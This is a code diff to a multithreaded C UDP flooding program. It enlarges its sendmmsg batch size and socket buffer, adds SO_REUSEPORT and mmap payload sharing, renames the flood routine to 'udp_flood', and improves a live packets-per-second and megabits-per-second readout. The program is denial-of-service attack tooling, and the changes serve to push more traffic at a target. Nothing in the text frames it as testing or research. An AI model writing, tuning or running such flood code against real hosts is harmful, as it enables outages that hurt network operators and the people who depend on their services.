@@ -10,7 +10,7 @@
 #include <fcntl.h>
 #include <time.h>
 
-#define MAX_BATCH 32
+#define MAX_BATCH 128
 #define SO_SNDBUF_SIZE (1024 * 1024 * 4)
 
 int pps_counter = 0;
@@ -25,21 +25,33 @@ struct thread_args {
 
 void* monitor_thread(void* arg) {
     (void)arg;
+
     while (1) {
         sleep(1);
-        double mbps = (mbps_counter * 8.0) / 1000000.0;
+
+        int pps = __sync_lock_test_and_set(&pps_counter, 0);
+        int bytes = __sync_lock_test_and_set(&mbps_counter, 0);
+
+        double mbps = (bytes * 8.0) / 1000000.0;     // Megabits/sec
+        double MBps = bytes / 1000000.0;             // Megabytes/sec
+        double kbps = (bytes * 8.0) / 1000.0;        // Kilobits/sec
+
         time_t now = time(NULL);
         struct tm* t = localtime(&now);
-        printf("\033[96m[%02d:%02d:%02d] PPS: %d | Mbps: %.2f\033[0m\n",
-               t->tm_hour, t->tm_min, t->tm_sec,
-               pps_counter, mbps);
-        __sync_lock_test_and_set(&pps_counter, 0);
-        __sync_lock_test_and_set(&mbps_counter, 0);
+
+        printf(
+            "\033[96m[%02d:%02d:%02d] "
+            "PPS: %6d | Mb/s: %7.2f | MB/s: %7.2f\033[0m\n",
+            t->tm_hour, t->tm_min, t->tm_sec,
+            pps, mbps, MBps
+        );
+        fflush(stdout);
     }
+
     return NULL;
 }
 
-void* udp_sendmmsg_flood(void* arg) {
+void* udp_flood(void* arg) {
     struct thread_args* args = (struct thread_args*)arg;
 
     int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
@@ -49,9 +61,10 @@ void* udp_sendmmsg_flood(void* arg) {
     }
 
     int sndbuf = SO_SNDBUF_SIZE;
+    int enable = 1;
+    setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &enable, sizeof(enable));
     setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
 
-    // Set non-blocking
     fcntl(sockfd, F_SETFL, O_NONBLOCK);
 
     struct sockaddr_in target;
@@ -120,20 +133,18 @@ int main(int argc, char* argv[]) {
 
     srand(time(NULL));
 
-    // Shared payload
-    char* payload = malloc(packet_size);
+    char* payload = mmap(NULL, packet_size, PROT_READ | PROT_WRITE,
+                            MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
     if (!payload) {
-        perror("malloc");
+        perror("mmap");
         return 1;
     }
     fill_payload(payload, packet_size, payload_mode);
 
-    // Launch monitor
     pthread_t monitor;
     pthread_create(&monitor, NULL, monitor_thread, NULL);
     pthread_detach(monitor);
 
-    // Threads
     pthread_t th[threads];
     struct thread_args args[threads];
 
@@ -143,13 +154,13 @@ int main(int argc, char* argv[]) {
         args[i].packet_size = packet_size;
         args[i].payload = payload;
 
-        pthread_create(&th[i], NULL, udp_sendmmsg_flood, &args[i]);
+        pthread_create(&th[i], NULL, udp_flood, &args[i]);
     }
 
     for (int i = 0; i < threads; ++i) {
         pthread_join(th[i], NULL);
     }
 
-    free(payload);
+    munmap(payload, packet_size);
     return 0;
 }
